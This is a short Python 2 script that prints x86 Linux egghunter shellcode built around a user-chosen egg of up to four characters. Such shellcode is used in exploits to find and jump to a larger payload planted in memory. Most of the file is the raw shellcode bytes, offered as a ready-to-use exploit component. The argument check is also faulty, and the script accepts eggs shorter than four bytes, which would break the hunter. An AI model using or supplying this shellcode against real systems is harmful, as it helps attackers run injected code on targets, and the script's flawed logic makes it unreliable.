#!/usr/bin/env python
import sys
import re

# Colorz
RED = "\x1B[1;31m"
BLU = "\x1B[1;34m"
GRE = "\x1B[1;32m"
RST = "\x1B[0;0;0m"
 
# Lambda
info_message = lambda x: '{}[*]{} {}'.format(BLU, RST, x)
suce_message = lambda x: '{}[+]{} {}'.format(GRE, RST, x)
erro_message = lambda x: '{}[-]{} {}'.format(RED, RST, x)


if len(sys.argv) < 1:
	print info_message('Usage: {} <egg>'.format(sys.argv[0]))
	sys.exit()

string = sys.argv[1]

if len(string) > 4:
	print erro_message('The egg can\'t be more than four letters')
	sys.exit()

hexchain = ''
for x in string:
	for y in re.findall('..', x.encode('hex')):
		hexchain += '\\x' + y

print suce_message("Your egghunter: ")
egghunter = '''
\\xfc\\x31\\xc9\\x31\\xd2\\x66\\x81\\xca\\xff\\x0f
\\x42\\x8d\\x5a\\x04\\x6a\\x21\\x58\\xcd\\x80\\x3c
\\xf2\\x74\\xee\\xb8
{}  // {}
\\x89\\xd7\\xaf
\\x75\\xe9\\xaf\\x75\\xe6\\xff\\xe7
'''.format(hexchain, string)

print egghunter